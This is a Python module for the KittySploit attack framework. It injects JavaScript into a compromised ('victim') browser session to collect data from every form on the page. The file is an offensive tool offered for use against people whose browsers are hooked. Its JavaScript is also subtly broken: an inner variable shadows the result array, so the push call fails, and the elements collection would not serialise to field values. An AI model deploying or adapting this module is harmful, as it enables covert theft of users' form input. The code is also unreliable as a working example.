from kittysploit import *

class Module(BrowserAuxiliary):

    __info__ = {
        "name": "capture all form",
        "description": "Capture all form data from the browser victim",
        "author": "KittySploit Team",
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
    }

    def run(self):

        code_js = """
        (function() {
            const forms = document.querySelectorAll('form');
            const formData = [];
            forms.forEach(form => {
                const formData = {
                    action: form.action,
                    method: form.method,
                    elements: form.elements
                };
                formData.push(formData);
            });
            return JSON.stringify(formData, null, 2);
        })();
        """
        return self.send_js(code_js)